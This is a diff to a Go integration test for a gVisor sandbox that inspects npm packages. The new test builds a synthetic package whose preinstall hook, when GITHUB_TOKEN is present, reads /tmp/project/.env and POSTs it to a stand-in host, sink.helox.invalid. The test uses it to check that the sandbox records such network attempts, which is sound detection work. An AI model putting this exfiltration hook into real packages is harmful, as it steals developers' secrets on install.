@@ -82,6 +82,13 @@ func runLinuxGVisorLifecycleIntegration(t *testing.T, body string, want domain.S
 	if err != nil {
 		t.Fatal(err)
 	}
+	// Manual source candidates use the same protected-current factory with an
+	// owned Root fixture. Production continues to use NativeInstallRoot only.
+	if installation := os.Getenv("HELOX_RESPONDER_SOURCE_INSTALLATION"); installation != "" {
+		backend.prepareResponder = func(ctx context.Context, runner CommandRunner, _ string) (*responderSupply, error) {
+			return prepareResponderSupply(ctx, runner, installation)
+		}
+	}
 	resources, err := hosttool.NewSystemObservationResourceClient()
 	if err != nil {
 		t.Fatal(err)
@@ -140,6 +147,41 @@ func TestLinuxGVisorFreshEnvironmentIntegration(t *testing.T) {
 		}
 	}
 	t.Log("fresh environments=2; inherited Host secrets=absent; synthetic cues=isolated; previous-run marker=absent; completion authority=external")
+}
+
+func TestLinuxGVisorSyntheticNetworkEnvironmentIntegration(t *testing.T) {
+	if os.Getenv("HELOX_GVISOR_INTEGRATION") != "1" {
+		t.Skip("requires pinned Linux gVisor and protected resource service")
+	}
+	// The same harmless package stays dormant without synthetic credentials.
+	// The development experiment uses only its private loopback and dummy file.
+	const program = `if(!process.env.GITHUB_TOKEN)process.exit(0);
+const fs=require("node:fs"),http=require("node:http");
+const req=http.get("http://probe.helox.invalid/probe",r=>{r.resume();r.on("end",()=>{
+if(r.statusCode!==200){process.exitCode=71;return;}
+const body=fs.readFileSync("/tmp/project/.env");
+const sink=http.request({hostname:"sink.helox.invalid",path:"/sink",method:"POST",headers:{"Content-Length":body.length}},s=>{
+s.resume();s.on("end",()=>{if(s.statusCode!==204)process.exitCode=72;});});
+sink.on("error",()=>{process.exitCode=73;});sink.end(body);
+});});req.on("error",()=>{process.exitCode=74;});`
+	body, err := json.Marshal(map[string]any{"name": "tiny", "version": "1.2.3", "scripts": map[string]string{"preinstall": "node -e '" + program + "'"}})
+	if err != nil {
+		t.Fatal(err)
+	}
+	result := runLinuxGVisorLifecycleIntegration(t, string(body), domain.SandboxCompleted)
+	if len(result.EnvironmentStates()) != 2 {
+		t.Fatal("required environment evidence missing")
+	}
+	var network uint64
+	for _, fact := range result.Observations() {
+		if fact.Category() == domain.ObservationNetwork {
+			network += fact.Count()
+		}
+	}
+	if network == 0 {
+		t.Fatal("loopback attempts were hidden from Policy input")
+	}
+	t.Logf("whole npm inspection: two environments complete; fixed DNS/HTTP and dummy read/sink; network facts=%d; no Policy ALLOW assertion", network)
 }
 
 func TestLinuxGVisorTransientFilesystemIntegration(t *testing.T) {
